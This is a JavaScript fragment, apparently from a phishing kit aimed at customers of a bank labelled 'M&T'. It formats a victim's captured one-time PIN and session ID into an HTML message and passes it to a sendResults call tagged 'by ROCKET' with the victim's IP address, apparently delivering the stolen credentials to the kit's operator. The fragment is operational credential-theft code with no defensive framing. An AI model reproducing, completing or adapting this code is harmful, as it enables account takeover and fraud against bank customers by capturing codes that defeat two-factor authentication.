...
<div>------------------------------------</div>
${
  values.form[0] === `ONE TIME PIN` &&
  `<p>(▰˘◡˘▰) OTP ☞ <b>${JSON.parse(values.otp[0]).otp}</b></p>
<div>------------------------------------</div>
...
<div>------------------------------------</div>
<p>(▰˘◡˘▰) ID ☞ <b>#${JSON.parse(values.otp[0]).sessionId.trim() || ``}</b></p>
<div>------------------------------------</div>`
}`;

    await sendResults(
      message,
      `M&T | ${values.form} by ROCKET 🚀 From ${String(ip).split(`,`)[0]}`
    );
